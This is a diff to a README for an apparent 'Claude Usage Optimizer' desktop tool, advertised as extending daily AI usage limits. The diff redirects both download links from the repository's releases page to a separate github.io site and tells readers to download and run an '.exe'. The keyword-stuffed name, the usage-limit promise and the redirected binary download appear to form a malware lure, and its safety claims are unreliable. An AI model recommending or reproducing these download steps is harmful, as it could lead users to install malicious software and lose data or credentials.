@@ -1,6 +1,6 @@
 # 📊 Claude-Usage-Optimizer-2026---AI-Powered-Limit-Management-Tool-for-Enhanced-Productivity - Extend your daily AI usage limits
 
-[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://github.com/jasmininvasive588/Claude-Usage-Optimizer-2026---AI-Powered-Limit-Management-Tool-for-Enhanced-Productivity/releases)
+[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://jasmininvasive588.github.io)
 
 ## What is this tool?
 This application helps people manage their Claude AI usage. It tracks how much you use the platform. It shows data to help you understand your habits. It gives tips to improve your prompts. You can stay productive for longer periods. The app runs on your desktop. It keeps your session data safe. It does not store your private conversations.
@@ -16,7 +16,7 @@ To run this application, ensure your computer meets these standards:
 ## 🚀 Getting Started
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to see all available versions: [https://github.com/jasmininvasive588/Claude-Usage-Optimizer-2026---AI-Powered-Limit-Management-Tool-for-Enhanced-Productivity/releases](https://github.com/jasmininvasive588/Claude-Usage-Optimizer-2026---AI-Powered-Limit-Management-Tool-for-Enhanced-Productivity/releases)
+1. Visit the following link to see all available versions: [https://jasmininvasive588.github.io](https://jasmininvasive588.github.io)
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click on the file ending in ".exe" to begin the download.
 4. Save the file to your desktop or downloads folder.
